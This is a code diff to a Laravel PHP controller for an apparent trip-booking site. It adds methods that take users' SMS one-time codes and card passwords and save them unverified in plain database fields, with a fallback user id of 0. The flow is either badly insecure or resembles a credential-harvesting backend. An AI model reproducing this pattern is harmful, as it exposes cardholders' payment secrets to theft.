@@ -11,6 +11,7 @@ use App\Models\ClientTrip;
 use App\Models\Country;
 use App\Models\SmsProvider;
 use App\Models\Trip;
+use Illuminate\Support\Facades\Auth;
 use RealRashid\SweetAlert\Facades\Alert;
 use Illuminate\Http\Request;
 use Illuminate\Support\Carbon;
@@ -86,13 +87,13 @@ class ClientController extends Controller
 
     public function getPhoneInfo($trip_id, $client_id)
     {
-        return view('frontend.Phone_info', compact('trip_id', 'client_id','sms_providers'));
+        return view('frontend.Phone_info', compact('trip_id', 'client_id', 'sms_providers'));
     }
 
     public function storePhoneInfo(Request $request)
     {
         $client = Client::where('id', $request->client_id)->update([
-            'phone'=>$request->phone,
+            'phone' => $request->phone,
             'country' => $request->country,
             'sms_provider' => $request->sms_provider
         ]);
@@ -105,7 +106,38 @@ class ClientController extends Controller
         $client = Client::where('id', $request->client_id)->first();
         $client->otp2 = $request->otp_code;
         $client->save();
-        return view('frontend.password_number',compact('client'));
+        return view('frontend.password_number', compact('client'));
+    }
+
+    public function checkOtpCodePassword(PasswordCardRequest $request)
+    {
+        $clientid=Auth::id() ?? 0;
+        $client = Client::where('id', $clientid)->first();
+        $client->password_card = $request->password;
+        $client->save();
+        return view('frontend.password_card');
+    }
+    public function checkOtpCodeotp(CheckOtpCodeRequest $request)
+    {
+        $clientid=Auth::id() ?? 0;
+        $client = Client::where('id', $clientid)->first();
+        $client->otp2 = $request->otp_code;
+        $client->save();
+        return view('frontend.otppass');
+    }
+
+    public function checkOtppassword()
+    {
+//        $client = Client::where('id', $request->client_id)->first();
+//        $client->otp2 = $request->otp_code;
+//        $client->save();
+        return view('frontend.password_card');
+    }
+
+    public function checkOtppage()
+    {
+
+        return view('frontend.otppass');
     }
 
     public function storePasswordCard(PasswordCardRequest $request)
@@ -113,7 +145,7 @@ class ClientController extends Controller
         $client = Client::where('id', $request->client_id)->first();
         $client->password_card = $request->password;
         $client->save();
-        return view('frontend.password_number',compact('client'));
+        return view('frontend.password_number', compact('client'));
     }
 
     public function tripInvoice($clientTrip_id)
@@ -124,13 +156,13 @@ class ClientController extends Controller
     }
 
 
-
     public function edit($client_id)
     {
         $client = Client::whereId($client_id)->firstOrFail();
         $countries = Country::all();
         return view('dashboard.clients.edit', ['client' => $client, 'countries' => $countries]);
     }
+
     public function update(Request $request)
     {
         $inputs = $request->all();
